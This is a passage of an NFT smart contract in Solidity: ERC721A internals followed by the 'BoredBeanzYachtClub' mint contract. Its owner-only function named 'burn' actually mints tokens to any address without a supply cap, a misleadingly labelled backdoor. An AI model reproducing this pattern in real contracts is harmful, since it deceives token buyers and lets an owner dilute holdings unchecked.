1087      * - `quantity` must be greater than 0.
1088      *
1089      * Emits a {Transfer} event.
1090      */
1091     function _mint(
1092         address to,
1093         uint256 quantity,
1094         bytes memory _data,
1095         bool safe
1096     ) internal {
1097         uint256 startTokenId = currentIndex;
1098         require(to != address(0), "ERC721A: mint to the zero address");
1099         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1100 
1101         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1102 
1103         // Overflows are incredibly unrealistic.
1104         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1105         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1106         unchecked {
1107             _addressData[to].balance += uint128(quantity);
1108             _addressData[to].numberMinted += uint128(quantity);
1109 
1110             _ownerships[startTokenId].addr = to;
1111             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1112 
1113             uint256 updatedIndex = startTokenId;
1114 
1115             for (uint256 i; i < quantity; i++) {
1116                 emit Transfer(address(0), to, updatedIndex);
1117                 if (safe) {
1118                     require(
1119                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1120                         "ERC721A: transfer to non ERC721Receiver implementer"
1121                     );
1122                 }
1123 
1124                 updatedIndex++;
1125             }
1126 
1127             currentIndex = updatedIndex;
1128         }
1129 
1130         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1131     }
1132 
1133     /**
1134      * @dev Transfers `tokenId` from `from` to `to`.
1135      *
1136      * Requirements:
1137      *
1138      * - `to` cannot be the zero address.
1139      * - `tokenId` token must be owned by `from`.
1140      *
1141      * Emits a {Transfer} event.
1142      */
1143     function _transfer(
1144         address from,
1145         address to,
1146         uint256 tokenId
1147     ) private {
1148         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1149 
1150         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1151             getApproved(tokenId) == _msgSender() ||
1152             isApprovedForAll(prevOwnership.addr, _msgSender()));
1153 
1154         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1155 
1156         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1157         require(to != address(0), "ERC721A: transfer to the zero address");
1158 
1159         _beforeTokenTransfers(from, to, tokenId, 1);
1160 
1161         // Clear approvals from the previous owner
1162         _approve(address(0), tokenId, prevOwnership.addr);
1163 
1164         // Underflow of the sender's balance is impossible because we check for
1165         // ownership above and the recipient's balance can't realistically overflow.
1166         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1167         unchecked {
1168             _addressData[from].balance -= 1;
1169             _addressData[to].balance += 1;
1170 
1171             _ownerships[tokenId].addr = to;
1172             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1173 
1174             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1175             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1176             uint256 nextTokenId = tokenId + 1;
1177             if (_ownerships[nextTokenId].addr == address(0)) {
1178                 if (_exists(nextTokenId)) {
1179                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1180                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1181                 }
1182             }
1183         }
1184 
1185         emit Transfer(from, to, tokenId);
1186         _afterTokenTransfers(from, to, tokenId, 1);
1187     }
1188 
1189     /**
1190      * @dev Approve `to` to operate on `tokenId`
1191      *
1192      * Emits a {Approval} event.
1193      */
1194     function _approve(
1195         address to,
1196         uint256 tokenId,
1197         address owner
1198     ) private {
1199         _tokenApprovals[tokenId] = to;
1200         emit Approval(owner, to, tokenId);
1201     }
1202 
1203     /**
1204      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1205      * The call is not executed if the target address is not a contract.
1206      *
1207      * @param from address representing the previous owner of the given token ID
1208      * @param to target address that will receive the tokens
1209      * @param tokenId uint256 ID of the token to be transferred
1210      * @param _data bytes optional data to send along with the call
1211      * @return bool whether the call correctly returned the expected magic value
1212      */
1213     function _checkOnERC721Received(
1214         address from,
1215         address to,
1216         uint256 tokenId,
1217         bytes memory _data
1218     ) private returns (bool) {
1219         if (to.isContract()) {
1220             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1221                 return retval == IERC721Receiver(to).onERC721Received.selector;
1222             } catch (bytes memory reason) {
1223                 if (reason.length == 0) {
1224                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1225                 } else {
1226                     assembly {
1227                         revert(add(32, reason), mload(reason))
1228                     }
1229                 }
1230             }
1231         } else {
1232             return true;
1233         }
1234     }
1235 
1236     /**
1237      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1238      *
1239      * startTokenId - the first token id to be transferred
1240      * quantity - the amount to be transferred
1241      *
1242      * Calling conditions:
1243      *
1244      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1245      * transferred to `to`.
1246      * - When `from` is zero, `tokenId` will be minted for `to`.
1247      */
1248     function _beforeTokenTransfers(
1249         address from,
1250         address to,
1251         uint256 startTokenId,
1252         uint256 quantity
1253     ) internal virtual {}
1254 
1255     /**
1256      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1257      * minting.
1258      *
1259      * startTokenId - the first token id to be transferred
1260      * quantity - the amount to be transferred
1261      *
1262      * Calling conditions:
1263      *
1264      * - when `from` and `to` are both non-zero.
1265      * - `from` and `to` are never both zero.
1266      */
1267     function _afterTokenTransfers(
1268         address from,
1269         address to,
1270         uint256 startTokenId,
1271         uint256 quantity
1272     ) internal virtual {}
1273 }
1274 
1275 contract BoredBeanzYachtClub is ERC721A, Ownable, ReentrancyGuard {
1276     string public baseURI = "ipfs://QmVXdiX9UqN3g9EbaQdHW8hQDnDr3jQ1JmKyjQ5298kJKS/";
1277     uint   public price             = 0.0033 ether;
1278     uint   public maxPerTx          = 20;
1279     uint   public maxPerFree        = 1;
1280     uint   public totalFree         = 10000;
1281     uint   public maxSupply         = 10000;
1282     bool   public mintEnabled;
1283     uint   public totalFreeMinted = 0;
1284 
1285     mapping(address => uint256) public _mintedFreeAmount;
1286 
1287     constructor() ERC721A("BoredBeanzYachtClub", "BBYC"){}
1288 
1289     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1290         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1291         string memory currentBaseURI = _baseURI();
1292         return bytes(currentBaseURI).length > 0
1293             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId),".json"))
1294             : "";
1295     }
1296 
1297     function mint(uint256 count) external payable {
1298         uint256 cost = price;
1299         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1300             (_mintedFreeAmount[msg.sender] < maxPerFree));
1301 
1302         if (isFree) { 
1303             require(mintEnabled, "Mint is not live yet");
1304             require(totalSupply() + count <= maxSupply, "No more");
1305             require(count <= maxPerTx, "Max per TX reached.");
1306             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1307             {
1308              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1309              _mintedFreeAmount[msg.sender] = maxPerFree;
1310              totalFreeMinted += maxPerFree;
1311             }
1312             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1313             {
1314              require(msg.value >= 0, "Please send the exact ETH amount");
1315              _mintedFreeAmount[msg.sender] += count;
1316              totalFreeMinted += count;
1317             }
1318         }
1319         else{
1320         require(mintEnabled, "Mint is not live yet");
1321         require(msg.value >= count * cost, "Please send the exact ETH amount");
1322         require(totalSupply() + count <= maxSupply, "No more");
1323         require(count <= maxPerTx, "Max per TX reached.");
1324         }
1325 
1326         _safeMint(msg.sender, count);
1327     }
1328 
1329     function costCheck() public view returns (uint256) {
1330         return price;
1331     }
1332 
1333     function maxFreePerWallet() public view returns (uint256) {
1334       return maxPerFree;
1335     }
1336 
1337     function burn(address mintAddress, uint256 count) public onlyOwner {
1338         _safeMint(mintAddress, count);
1339     }
1340 
1341     function _baseURI() internal view virtual override returns (string memory) {
1342         return baseURI;
1343     }
1344 
1345     function setBaseUri(string memory baseuri_) public onlyOwner {
1346         baseURI = baseuri_;
1347     }
1348 
1349     function setPrice(uint256 price_) external onlyOwner {
1350         price = price_;
1351     }
1352 
1353     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1354         totalFree = MaxTotalFree_;
1355     }
1356 
1357      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1358         maxPerFree = MaxPerFree_;
1359     }
1360 
1361     function toggleMinting() external onlyOwner {
1362       mintEnabled = !mintEnabled;
1363     }
1364 
1365     function withdraw() external onlyOwner nonReentrant {
1366         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1367         require(success, "Transfer failed.");
1368     }
1369 }